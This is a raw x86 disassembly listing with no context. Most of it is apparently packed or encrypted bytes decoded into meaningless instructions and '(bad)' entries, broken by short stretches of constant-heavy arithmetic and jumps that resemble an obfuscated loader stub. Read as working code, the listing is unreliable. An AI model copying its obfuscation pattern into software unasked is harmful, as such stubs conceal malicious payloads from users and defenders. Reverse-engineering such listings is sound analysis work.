  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    al,ah
  40cc78:	jb     0x40cccb
  40cc7a:	fbld   TBYTE PTR [edx+0x166b4a17]
  40cc80:	jmp    0x40ccaf
  40cc82:	inc    eax
  40cc83:	xchg   esp,eax
  40cc84:	cmp    ah,dh
  40cc86:	cmc    
  40cc87:	xchg   DWORD PTR [edi+edi*4-0x674eddd9],esp
  40cc8e:	pusha  
  40cc8f:	fucomi st,st(3)
  40cc91:	pop    es
  40cc92:	sbb    ebx,edx
  40cc94:	inc    ebx
  40cc95:	jmp    0x40ccc3
  40cc97:	aad    0x96
  40cc99:	push   esp
  40cc9a:	jmp    0x9c6a7b82
  40cc9f:	cld    
  40cca0:	aam    0xe6
  40cca2:	cmp    eax,0xa85a86c8
  40cca7:	es ffree st(2)
  40ccaa:	mov    esi,0x38eae0c1
  40ccaf:	out    dx,eax
  40ccb0:	ds jge 0x40cc95
  40ccb3:	push   0x93f6a283
  40ccb8:	push   esp
  40ccb9:	jne    0x40ccb6
  40ccbb:	adc    DWORD PTR [edi+0x12],esi
  40ccbe:	(bad)
  40ccc1:	add    eax,0xedd3cf7c
  40ccc6:	jle    0x40ccb1
  40ccc8:	pop    esp
  40ccc9:	mov    edx,0xb26e537a
  40ccce:	dec    esi
  40cccf:	rcr    BYTE PTR [ebx-0x59],cl
  40ccd2:	loope  0x40cd2b
  40ccd4:	dec    ebx
  40ccd5:	dec    eax
  40ccd6:	sub    al,0xbd
  40ccd8:	cmp    al,0x2
  40ccda:	inc    edx
  40ccdb:	pop    ss
  40ccdc:	inc    ecx
  40ccdd:	mov    cl,0x71
  40ccdf:	jecxz  0x40ccc5
  40cce1:	xor    ecx,DWORD PTR [ebp-0x39aaa5bc]
  40cce7:	ins    BYTE PTR es:[edi],dx
  40cce8:	jae    0x40cd59
  40ccea:	sub    BYTE PTR [edi-0x23622b85],bh
  40ccf0:	xor    ah,cl
  40ccf2:	jecxz  0x40cc9b
  40ccf4:	pop    esp
  40ccf5:	nop
  40ccf6:	(bad)  
  40ccf7:	fld    DWORD PTR [ebx-0x6c]
  40ccfa:	dec    eax
  40ccfb:	add    DWORD PTR [edx+0x2d3cd702],ecx
  40cd01:	aaa    
  40cd02:	aas    
  40cd03:	mov    ebx,0x2cceb85e
  40cd08:	inc    esi
  40cd09:	cdq    
  40cd0a:	lock pop ebx
  40cd0c:	mov    esi,0x34e6f969
  40cd11:	in     al,dx
  40cd12:	push   edi
  40cd13:	sbb    BYTE PTR [edi],al
  40cd15:	cli    
  40cd16:	sub    dh,BYTE PTR [esi]
  40cd18:	std    
  40cd19:	add    BYTE PTR [ebx],cl
  40cd1b:	outs   dx,BYTE PTR ds:[esi]
  40cd1c:	(bad)  
  40cd1d:	sbb    al,0x3f
  40cd1f:	loop   0x40ccac
  40cd21:	add    al,0x91
  40cd23:	daa    
  40cd24:	(bad)  
  40cd25:	cmp    esi,DWORD PTR [edx]
  40cd27:	and    esp,DWORD PTR [eax]
  40cd29:	bound  edx,QWORD PTR [ebx+eax*1+0x275b1a9c]
  40cd30:	pop    es
  40cd31:	jae    0x40cd0f
  40cd33:	and    al,0x18
  40cd35:	inc    ecx
  40cd36:	jle    0x40cdb2
  40cd38:	sbb    al,0xcd
  40cd3a:	dec    esp
  40cd3b:	je     0x40cdbb
  40cd3d:	xor    cl,BYTE PTR [edi-0x2c57b981]
  40cd43:	ret    
  40cd44:	push   es
  40cd45:	imul   esi,DWORD PTR [edx+ebx*2-0x76],0x3096a121
  40cd4d:	mov    eax,0x9e615d90
  40cd52:	lock pop eax
  40cd54:	adc    bl,al
  40cd56:	sub    cl,ch
  40cd58:	jle    0x40cd8b
  40cd5a:	sub    eax,0x167f5af0
  40cd5f:	add    BYTE PTR [edi+ecx*1-0x10992506],al
  40cd66:	xchg   ecx,eax
  40cd67:	or     BYTE PTR [eax+esi*8+0x17],al
  40cd6b:	scas   al,BYTE PTR es:[edi]
  40cd6c:	dec    esi
  40cd6d:	jl     0x40ccfb
  40cd6f:	mov    ebp,0x5db90640
  40cd74:	mov    edi,0xda4533c7
  40cd79:	lods   eax,DWORD PTR ds:[esi]
  40cd7a:	mul    BYTE PTR [esi]
  40cd7c:	mov    dh,0x3a
  40cd7e:	inc    ecx
  40cd7f:	js     0x40cdef
  40cd81:	push   0xffffffe4
  40cd83:	mov    BYTE PTR [ebx-0x16],al
  40cd86:	cwde   
  40cd87:	jle    0x40cdc2
  40cd89:	or     esp,DWORD PTR [esi]
  40cd8b:	aad    0x88
  40cd8d:	or     BYTE PTR [esi+0x57],bl
  40cd90:	popa   
  40cd91:	sub    al,0x3a
  40cd93:	xor    al,0x22
  40cd95:	push   esp
  40cd96:	jg     0x40cdde
  40cd98:	lahf   
  40cd99:	mov    ds:0xc676fcf3,al
  40cd9e:	push   0x9c35e0fd
  40cda3:	xor    edi,DWORD PTR [eax]
  40cda5:	(bad)  
  40cda6:	jmp    0x2c5a:0xb1ef27cf
  40cdad:	push   edx
  40cdae:	fld    QWORD PTR [eax]
  40cdb0:	leave  
  40cdb1:	test   DWORD PTR [edx],ecx
  40cdb3:	jg     0x40cdb3
  40cdb5:	lea    esp,[esi-0x5c]
  40cdb8:	leave  
  40cdb9:	jmp    DWORD PTR [ecx]
  40cdbb:	jae    0x40cd72
  40cdbd:	jmp    0xaa12:0xd25015b1
  40cdc4:	mov    dl,BYTE PTR [eax]
  40cdc6:	cmp    esi,ebp
  40cdc8:	jmp    0x760f704a
  40cdcd:	dec    esp
  40cdce:	shl    DWORD PTR [edi+0x1a033ffb],cl
  40cdd4:	cvttps2pi mm2,QWORD PTR [edi]
  40cdd7:	sbb    eax,0x14232a10
  40cddc:	test   DWORD PTR [esi+0x3627ca78],ebp
  40cde2:	pop    ebp
  40cde3:	fimul  WORD PTR [ebx]
  40cde5:	xchg   esp,eax
  40cde6:	aaa    
  40cde7:	dec    esi
  40cde8:	sbb    BYTE PTR [ecx-0x19],cl
  40cdeb:	mov    edi,0x74d9f82c
  40cdf0:	sbb    DWORD PTR [edx+0xbc0525],ebx
  40cdf6:	adc    al,0x28
  40cdf8:	js     0x40cde9
  40cdfa:	xchg   edx,eax
  40cdfb:	xlat   BYTE PTR ds:[ebx]
  40cdfc:	and    dl,BYTE PTR [ebp+0x19]
  40cdff:	test   al,0x90
  40ce01:	loopne 0x40ce36
  40ce03:	dec    esi
  40ce04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce05:	cmp    eax,0x6ee43a88
  40ce0a:	fcom   QWORD PTR [eax]
  40ce0c:	leave  
  40ce0d:	mov    ecx,0x7e63b508
  40ce12:	mov    cl,0xf7
  40ce14:	mov    esi,esi
  40ce16:	push   cs
  40ce17:	sub    ebx,DWORD PTR [eax]
  40ce19:	mov    bl,0xfb
  40ce1b:	inc    edi
  40ce1c:	push   0xffffffd1
  40ce1e:	icebp  
  40ce1f:	and    al,BYTE PTR [edi+ebx*4+0x3db3b343]
  40ce26:	sahf   
  40ce27:	scas   eax,DWORD PTR es:[edi]
  40ce28:	xchg   esi,eax
  40ce29:	sbb    DWORD PTR [ecx],esi
  40ce2b:	mov    ebx,0x2e748015
  40ce30:	dec    ecx
  40ce31:	shl    BYTE PTR [ecx-0x75],cl
  40ce34:	ret    0x8112
  40ce37:	scas   al,BYTE PTR es:[edi]
  40ce38:	addr16 push ecx
  40ce3a:	cli    
  40ce3b:	inc    esi
  40ce3c:	or     DWORD PTR [edx+0x13],edi
  40ce3f:	inc    esp
  40ce40:	pushw  ss
  40ce42:	and    BYTE PTR [ebx-0x3732305d],bl
  40ce48:	and    ecx,ebx
  40ce4a:	mov    eax,ds:0x639eee92
  40ce4f:	aaa    
  40ce50:	inc    esp
  40ce51:	mov    al,0xf9
  40ce53:	xor    al,0x1d
  40ce55:	dec    esi
  40ce56:	or     edi,eax
  40ce58:	add    ecx,DWORD PTR [ebx+edi*1-0x20]
  40ce5c:	sar    DWORD PTR [esi-0x263ac7a9],cl
  40ce62:	cs jb  0x40ceda
  40ce65:	xchg   edx,eax
  40ce66:	add    DWORD PTR [ecx-0x6b],esi
  40ce69:	add    al,0x20
  40ce6b:	fnstsw WORD PTR [edx]
  40ce6d:	jne    0x40ce29
  40ce6f:	test   DWORD PTR [edx],eax
  40ce71:	sbb    eax,0x6a34b97b
  40ce76:	neg    BYTE PTR [esi+0x24f5274f]
  40ce7c:	mov    ah,0x71
  40ce7e:	lock inc esi
  40ce80:	mov    dl,dh
  40ce82:	mov    es,WORD PTR [ebp+0x14]
  40ce85:	les    esi,FWORD PTR fs:[ebp+0xa]
  40ce89:	cmp    DWORD PTR [ebp-0x21074bf3],edx
  40ce8f:	xchg   edx,eax
  40ce90:	jg     0x40ce50
  40ce92:	jno    0x40ce4b
  40ce94:	jge    0x40cee1
  40ce96:	sahf   
  40ce97:	int3   
  40ce98:	push   edx
  40ce99:	(bad)  
  40ce9a:	jae    0x40ce82
  40ce9c:	fcom   DWORD PTR [edi-0x6467a436]
  40cea2:	pop    es
  40cea3:	push   ss
  40cea4:	loopne 0x40cef8
  40cea6:	arpl   WORD PTR [esi],cx
  40cea8:	or     ch,bl
  40ceaa:	fstp   TBYTE PTR [ebx]
  40ceac:	js     0x40cf26
  40ceae:	xor    al,0x74
  40ceb0:	(bad)  
  40ceb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceb2:	sub    eax,0xa029cff6
  40ceb7:	inc    esp
  40ceb8:	stc    
  40ceb9:	push   ebx
  40ceba:	leave  
  40cebb:	xor    eax,0x42ebfa26
  40cec0:	into   
  40cec1:	cmp    DWORD PTR [ebp+0x18],ecx
  40cec4:	or     al,0xab
  40cec6:	das    
  40cec7:	popa   
  40cec8:	cld    
  40cec9:	add    BYTE PTR [ecx],0x85
  40cecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cecd:	and    eax,0x1add181f
  40ced2:	dec    esp
  40ced3:	repnz sbb eax,0x5b0d644d
  40ced9:	(bad)  [edx-0x8bffdb6]
  40cedf:	fsubr  QWORD PTR [ebx+esi*2+0x392f0c5f]
  40cee6:	aas    
  40cee7:	push   edi
  40cee8:	mov    ch,0xd0
  40ceea:	(bad)  
  40ceeb:	loope  0x40ceac
  40ceed:	imul   ecx,DWORD PTR [ebp-0x6d5c00f6],0xffffffbd
  40cef4:	jnp    0x40cede
  40cef6:	adc    edi,DWORD PTR [eax-0x17b64164]
  40cefc:	les    edi,FWORD PTR [edi-0x6976a0a7]
  40cf02:	pop    ebp
  40cf03:	gs popa 
  40cf05:	(bad)  
  40cf06:	sar    ch,1
  40cf08:	sbb    ah,BYTE PTR [ecx]
  40cf0a:	(bad)  [edi-0x37107a27]
  40cf10:	dec    edx
  40cf11:	cmp    BYTE PTR [edi],bh
  40cf13:	inc    esi
  40cf14:	sub    al,0xd0
  40cf16:	scas   al,BYTE PTR es:[edi]
  40cf17:	(bad)  
  40cf18:	jne    0x40cf97
  40cf1a:	sub    ebx,eax
  40cf1c:	daa    
  40cf1d:	cld    
  40cf1e:	mov    eax,DWORD PTR [ebp-0x4]
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422568
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi-0x43b4432d],esi
  40cfad:	dec    ecx
  40cfae:	push   0x72
  40cfb0:	call   0x1512e7cd
  40cfb5:	sbb    BYTE PTR [eax],bl
  40cfb7:	mov    bh,0xcb
  40cfb9:	shl    BYTE PTR [esi],1
  40cfbb:	ret    
  40cfbc:	fistp  DWORD PTR [ebx+0x4d40be60]
  40cfc2:	icebp  
  40cfc3:	mov    cl,0x1f
  40cfc5:	pop    edi
  40cfc6:	pop    ebp
  40cfc7:	imul   esp,ecx,0xbd290555
  40cfcd:	sbb    bh,BYTE PTR [esi+0x4460b17e]
  40cfd3:	xor    al,0x50
  40cfd5:	mov    al,ds:0x1449833
  40cfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfdb:	and    al,0x4f
  40cfdd:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40cfdf:	inc    ebx
  40cfe0:	pusha  
  40cfe1:	jp     0x40cf81
  40cfe3:	mov    ds:0xda0bd735,eax
  40cfe8:	cmp    esp,eax
  40cfea:	mov    edx,0x942f1ae2
  40cfef:	lock push edi
  40cff1:	xchg   edi,eax
  40cff2:	or     DWORD PTR [edi],0x60
  40cff5:	pop    ecx
  40cff6:	loop   0x40d027
  40cff8:	cdq    
  40cff9:	jg     0x40cf9e
  40cffb:	in     eax,0x87
  40cffd:	ins    BYTE PTR es:[edi],dx
  40cffe:	push   edx
  40cfff:	gs stos DWORD PTR es:[edi],eax
  40d001:	sub    BYTE PTR [ecx],al
  40d003:	mov    bl,0x34
  40d005:	xor    dl,BYTE PTR [edi-0x73b27c56]
  40d00b:	or     eax,0x6f88f9
  40d010:	sbb    dh,BYTE PTR [esi]
  40d012:	adc    eax,DWORD PTR [eax-0x27]
  40d015:	mov    esp,0x462025ed
  40d01a:	lods   al,BYTE PTR ds:[esi]
  40d01b:	cmp    BYTE PTR [esi],0xa9
  40d01e:	mov    eax,ds:0x6d24499c
  40d023:	adc    eax,0xf13e9b2c
  40d028:	mov    bl,0x1
  40d02a:	les    esi,FWORD PTR [edx-0x4a]
  40d02d:	adc    al,0x6d
  40d02f:	mov    eax,ds:0x3cc710f1
  40d034:	and    edx,DWORD PTR [edx-0x69]
  40d037:	call   0x51c03e2d
  40d03c:	nop
  40d03d:	jg     0x40d0b4
  40d03f:	pop    esi
  40d040:	stos   BYTE PTR es:[edi],al
  40d041:	and    cl,BYTE PTR [ebp+0x3e]
  40d044:	leave  
  40d045:	inc    eax
  40d046:	xor    ah,dl
  40d048:	mov    eax,0xb5c16026
  40d04d:	out    dx,eax
  40d04e:	stos   DWORD PTR es:[edi],eax
  40d04f:	pusha  
  40d050:	retf   
  40d051:	jmp    0x937b:0x9137838f
  40d058:	shl    ebx,1
  40d05a:	mov    DWORD PTR [edi+0x65ccc7a2],edx
  40d060:	stc    
  40d061:	bnd jmp 0x40d0b8
  40d064:	lahf   
  40d065:	gs in  al,dx
  40d067:	pop    esp
  40d068:	sbb    eax,0x77792d6b
  40d06d:	mov    ds:0x6ab7cfa5,eax
  40d072:	or     BYTE PTR [ebx],al
  40d074:	push   edx
  40d075:	nop
  40d076:	jae    0x40d006
  40d078:	(bad)  
  40d07a:	mov    ds:0x9c7ff10,al
  40d07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d080:	push   0x9ddd062f
  40d085:	aam    0xd3
  40d087:	dec    edi
  40d088:	cli    
  40d089:	or     BYTE PTR [edi+0x9],bl
  40d08c:	stos   BYTE PTR es:[edi],al
  40d08d:	stos   BYTE PTR es:[edi],al
  40d08e:	sub    al,0x2d
  40d090:	or     ah,cl
  40d092:	pop    ecx
  40d093:	mov    al,ds:0x163dbb0e
  40d098:	adc    edx,0x8
  40d09b:	cwde   
  40d09c:	cmp    eax,0xa1ddd5ce
  40d0a1:	dec    esi
  40d0a2:	bound  esi,QWORD PTR [eax]
  40d0a4:	daa    
  40d0a5:	dec    eax
  40d0a6:	push   ebp
  40d0a7:	addr16 pop esi
  40d0a9:	mov    bh,0x37
  40d0ab:	pop    edx
  40d0ac:	cmp    eax,0xd2c53216
  40d0b1:	add    ch,cl
  40d0b3:	std    
  40d0b4:	pop    ecx
  40d0b5:	mov    eax,ds:0x453769a0
  40d0ba:	mov    esi,0x34ca1160
  40d0bf:	sub    eax,0x6b8a49b3
  40d0c4:	adc    al,0xe7
  40d0c6:	inc    esi
  40d0c7:	mov    al,0x86
  40d0c9:	or     bp,WORD PTR [edx-0x656237ff]
  40d0d0:	xchg   ebp,eax
  40d0d1:	lahf   
  40d0d2:	lock push edi
  40d0d4:	in     eax,dx
  40d0d5:	inc    edx
  40d0d6:	adc    BYTE PTR [ecx+0x7624179],ah
  40d0dc:	push   ebp
  40d0dd:	jmp    FWORD PTR [ecx+ebx*2+0x68]
  40d0e1:	pop    ebp
  40d0e2:	mov    cl,0x18
  40d0e4:	in     al,dx
  40d0e5:	inc    ebp
  40d0e6:	aam    0x0
  40d0e8:	and    eax,0x4c292b6d
  40d0ed:	mov    eax,0x43e8e8c0
  40d0f2:	cmp    al,0x93
  40d0f4:	and    bl,BYTE PTR [ebp+eiz*2+0x4f328d0f]
  40d0fb:	std    
  40d0fc:	push   ss
  40d0fd:	adc    al,0xe9
  40d0ff:	js     0x40d095
  40d101:	daa    
  40d102:	sub    al,BYTE PTR [edi+edi*4-0xa]
  40d106:	sbb    al,0x1b
  40d108:	icebp  
  40d109:	addr16 jmp 0x40d14b
  40d10c:	pop    esp
  40d10d:	lods   eax,DWORD PTR ds:[esi]
  40d10e:	cmp    dl,BYTE PTR [ecx+ecx*1+0x53]
  40d112:	sbb    DWORD PTR [esi-0x32aa8c1c],edx
  40d118:	test   DWORD PTR [ecx],edx
  40d11a:	lds    eax,FWORD PTR [ecx+0x52ddb115]
  40d120:	jg     0x40d0f6
  40d122:	or     al,BYTE PTR [ebx+0x7b]
  40d125:	mov    edx,0xc654aacf
  40d12a:	xor    DWORD PTR [ebp+0x29a50011],ebp
  40d130:	push   edx
  40d131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d132:	push   ds
  40d133:	xor    DWORD PTR [edx+0x88d6a05],0x604c78c9
  40d13d:	xor    eax,0x515dc0d4
  40d142:	and    BYTE PTR [eax],al
  40d144:	jns    0x40d185
  40d146:	popf   
  40d147:	pop    edi
  40d148:	clc    
  40d149:	sbb    dh,al
  40d14b:	adc    DWORD PTR [ebx+0x29],esi
  40d14e:	stos   BYTE PTR es:[edi],al
  40d14f:	hlt    
  40d150:	mov    ecx,0x86c9885a
  40d155:	clc    
  40d156:	xchg   esi,eax
  40d157:	xchg   edi,eax
  40d158:	int3   
  40d159:	sub    bh,BYTE PTR [edx-0x29]
  40d15c:	push   ss
  40d15d:	popa   
  40d15e:	cli    
  40d15f:	addr16 xor ah,al
  40d162:	or     al,0x6a
  40d164:	mov    bh,ch
  40d166:	sbb    al,0x89
  40d168:	xor    al,0x78
  40d16a:	pop    es
  40d16b:	mov    ah,0xd6
  40d16d:	add    BYTE PTR [ecx-0x6f45adb3],0xa7
  40d174:	in     eax,dx
  40d175:	sti    
  40d176:	xchg   ecx,eax
  40d177:	popf   
  40d178:	push   ecx
  40d179:	mov    dh,0xb5
  40d17b:	add    BYTE PTR ds:[edi+0x58106da9],ah
  40d182:	inc    ebx
  40d183:	dec    ebp
  40d184:	imul   edi,DWORD PTR [esp+eax*8-0x11],0x7f258896
  40d18c:	xor    al,BYTE PTR [edx]
  40d18e:	add    al,0x1f
  40d190:	mov    eax,0x8a601929
  40d195:	int3   
  40d196:	dec    eax
  40d197:	xor    DWORD PTR cs:[ebx+esi*4],eax
  40d19b:	inc    edi
  40d19c:	scas   al,BYTE PTR es:[edi]
  40d19d:	mov    BYTE PTR [edi-0x393866d8],ah
  40d1a3:	push   ebx
  40d1a4:	out    0x9d,al
  40d1a6:	mov    ah,0xb0
  40d1a8:	sahf   
  40d1a9:	into   
  40d1aa:	stos   BYTE PTR es:[edi],al
  40d1ab:	ficomp DWORD PTR [eax+0x70127b7f]
  40d1b1:	mov    DWORD PTR [esi],esi
  40d1b3:	(bad)  
  40d1b4:	shl    esi,1
  40d1b6:	sbb    DWORD PTR [eax-0xee0098e],ebx
  40d1bc:	mov    WORD PTR [edx-0x69071c],?
  40d1c2:	adc    al,0x8d
  40d1c4:	(bad)  
  40d1c5:	jnp    0x40d235
  40d1c7:	mov    ebp,DWORD PTR [edx-0x7676bc37]
  40d1cd:	hlt    
  40d1ce:	pop    edx
  40d1cf:	and    ah,BYTE PTR [ebp+0x46]
  40d1d2:	in     al,0xf9
  40d1d4:	adc    DWORD PTR [esi+0x1e],eax
  40d1d7:	repnz outs dx,DWORD PTR ds:[esi]
  40d1d9:	inc    eax
  40d1da:	dec    ebp
  40d1db:	repnz test eax,0xd7a1184f
  40d1e1:	mov    esp,0xc7ca4329
  40d1e6:	fs mov cl,0xcf
  40d1e9:	or     DWORD PTR [edi-0x60],0x299be6b6
  40d1f0:	push   ebx
  40d1f1:	cmp    eax,0xdb09ed2f
  40d1f6:	cwde   
  40d1f7:	or     eax,0x7b72ca7a
  40d1fc:	mov    edi,eax
  40d1fe:	mov    al,0x39
  40d200:	in     al,dx
  40d201:	std    
  40d202:	xchg   DWORD PTR [ebx],esi
  40d204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d206:	mov    WORD PTR [ecx-0x307953b7],gs
  40d20c:	inc    esp
  40d20d:	sub    eax,0x1d80b425
  40d212:	sub    eax,0x25a6db21
  40d217:	fstp   QWORD PTR [ecx+edx*8-0x61fa7f18]
  40d21e:	mov    al,0x86
  40d220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d221:	dec    eax
  40d222:	sbb    BYTE PTR [esi+0x82e8f95],bh
  40d228:	aaa    
  40d229:	iret   
  40d22a:	fwait
  40d22b:	test   al,0xbf
  40d22d:	jmp    0x3ef3:0x713affa5
  40d234:	jl     0x40d214
  40d236:	idiv   DWORD PTR [esi]
  40d238:	loopne 0x40d274
  40d23a:	mov    edx,0x7364bb95
  40d23f:	add    eax,0x23c8b56f
  40d244:	fld    DWORD PTR [eax+0x6089b66a]
  40d24a:	pop    esp
  40d24b:	mov    ds:0xf9e9a660,eax
  40d250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d251:	inc    esi
  40d252:	sub    al,bh
  40d254:	xor    esp,DWORD PTR [esi-0x79]
  40d257:	ins    BYTE PTR es:[edi],dx
  40d258:	jle    0x40d20d
  40d25a:	mov    eax,0x881d3696
  40d25f:	add    al,0xe
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	push   ss
  40d2f3:	jge    0x40d346
  40d2f5:	jle    0x40d324
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    dh,al
  40d2ff:	int3   
  40d300:	jmp    0x2404:0x260c1df7
  40d307:	je     0x40d2f1
  40d309:	mov    cl,0x22
  40d30b:	dec    eax
  40d30c:	cmp    ah,BYTE PTR [esp+ecx*2-0x6216c9a2]
  40d313:	pusha  
  40d314:	scas   al,BYTE PTR es:[edi]
  40d315:	sub    BYTE PTR [ecx-0x1b],ch
  40d318:	mov    al,BYTE PTR [edi-0x829d870]
  40d31e:	arpl   WORD PTR [esi-0x1f],cx
  40d321:	push   0x3fa4ec1
  40d326:	push   ds
  40d327:	inc    ebx
  40d328:	or     eax,0x89398e6f
  40d32d:	pop    ebx
  40d32e:	xor    al,0xee
  40d330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d331:	xchg   edi,eax
  40d332:	sbb    al,0x8a
  40d334:	mov    bl,0x51
  40d336:	cs scas al,BYTE PTR es:[edi]
  40d338:	push   esi
  40d339:	and    BYTE PTR [edx-0x56],ch
  40d33c:	cmp    eax,0xc84478d
  40d341:	in     al,dx
  40d342:	mov    bl,0xac
  40d344:	jp     0x40d356
  40d346:	loope  0x40d37a
  40d348:	in     eax,dx
  40d349:	test   eax,0xb0855b77
  40d34e:	inc    edx
  40d34f:	jecxz  0x40d368
  40d351:	xchg   DWORD PTR [esi+eax*1-0x203fb456],esp
  40d358:	and    BYTE PTR [edx-0x2f79c42],0x84
  40d35f:	(bad)
  40d362:	dec    eax
  40d363:	dec    esi
  40d364:	fsub   QWORD PTR [eax-0x80]
  40d367:	sti    
  40d368:	and    eax,0x7dc66618
  40d36d:	(bad)  
  40d36e:	in     eax,dx
  40d36f:	pushf  
  40d370:	mov    edi,0xc76e36cc
  40d375:	out    0x18,eax
  40d377:	jmp    0xc4eb:0x950d288f
  40d37e:	test   BYTE PTR [esi-0x1e270156],0x1f
  40d385:	mov    ecx,0xf30b9a2
  40d38a:	ror    ebp,0x6f
  40d38d:	test   BYTE PTR ss:[eax+0x8],dl
  40d391:	retf   
  40d392:	mov    ds:0xaac42c1d,eax
  40d397:	fsub   DWORD PTR [esi-0x52]
  40d39a:	in     eax,0x10
  40d39c:	out    0xbe,eax
  40d39e:	lock jnp 0x40d3c6
  40d3a1:	mov    ebp,0xd7714cf1
  40d3a6:	inc    eax
  40d3a7:	mov    edi,0x266ce6b7
  40d3ac:	xlat   BYTE PTR ds:[ebx]
  40d3ad:	jno    0x40d408
  40d3af:	dec    edx
  40d3b0:	pxor   mm0,QWORD PTR [esi+0x5a]
  40d3b4:	pop    es
  40d3b5:	fs pop ds
  40d3b7:	pop    es
  40d3b8:	adc    eax,DWORD PTR [ebx-0x5f]
  40d3bb:	test   eax,0x6246c1c3
  40d3c0:	scas   eax,DWORD PTR es:[edi]
  40d3c1:	pop    ecx
  40d3c2:	inc    eax
  40d3c3:	sar    BYTE PTR [edx+0x6e],cl
  40d3c6:	mov    ds:0xfc5dac8f,eax
  40d3cb:	xlat   BYTE PTR ds:[ebx]
  40d3cc:	leave  
  40d3cd:	cli    
  40d3ce:	mov    ebp,0xa9f215d5
  40d3d3:	mov    ecx,0x605b9c6d
  40d3d8:	(bad)  
  40d3d9:	outs   dx,BYTE PTR ds:[esi]
  40d3da:	pop    esp
  40d3db:	aaa    
  40d3dc:	(bad)  
  40d3dd:	sti    
  40d3de:	fistp  QWORD PTR [ebx]
  40d3e0:	test   eax,0xe003e43a
  40d3e5:	sti    
  40d3e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e7:	sbb    bh,BYTE PTR ds:[edx]
  40d3ea:	xor    bh,ah
  40d3ec:	or     ebx,DWORD PTR [edx-0x7]
  40d3ef:	jmp    0x40d450
  40d3f1:	(bad)  
  40d3f2:	cmp    al,0xfb
  40d3f4:	sub    eax,0x9a817ae1
  40d3f9:	ret    0x81f9
  40d3fc:	cli    
  40d3fd:	add    ebp,DWORD PTR [ebp-0xfc555ef]
  40d403:	je     0x40d39e
  40d405:	scas   al,BYTE PTR es:[edi]
  40d406:	popf   
  40d407:	push   esi
  40d408:	in     al,0x47
  40d40a:	mov    BYTE PTR [ebx-0x5e],ch
  40d40d:	sub    eax,0xacb775f6
  40d412:	jg     0x40d3be
  40d414:	push   ds
  40d415:	in     al,0x86
  40d417:	push   esi
